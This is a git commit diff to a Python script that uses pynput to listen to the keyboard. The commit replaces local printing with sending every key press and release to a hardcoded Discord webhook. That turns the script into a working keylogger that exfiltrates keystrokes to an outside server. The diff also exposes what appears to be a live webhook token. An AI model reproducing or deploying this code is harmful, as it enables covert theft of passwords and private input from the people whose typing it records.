beb862d32e5aedfc2e711c1e275709c238c3d042
KanAvR <kanav.romi@indusschoolpune.com>
2023-09-19 12:39:12 +0530

    added discord webhooks

--- main.py
+++ main.py
@@ -1,15 +1,25 @@
 from pynput import keyboard
+from dhooks import Webhook
+
+
+# Discord Webhook
+log_send = Webhook('https://discord.com/api/webhooks/1153571420689928192/dsIjIP-uAXVdFvB82jBmWg5diV7_1WPHZpZc8Aqny9P9wGXKa6ISYTZAnguY3GjAEOFR')
+
+test = input('test')
+log_send.send('test')
+
+
 
 def on_press(key):
     try:
-        print('alphanumeric key {0} pressed'.format(
+        log_send.send('```alphanumeric key {0} pressed```'.format(
             key.char))
     except AttributeError:
-        print('special key {0} pressed'.format(
+        log_send.send('```special key {0} pressed```'.format(
             key))
 
 def on_release(key):
-    print('{0} released'.format(
+    log_send.send('```{0} released```'.format(
         key))
     if key == keyboard.Key.esc:
         # Stop listener
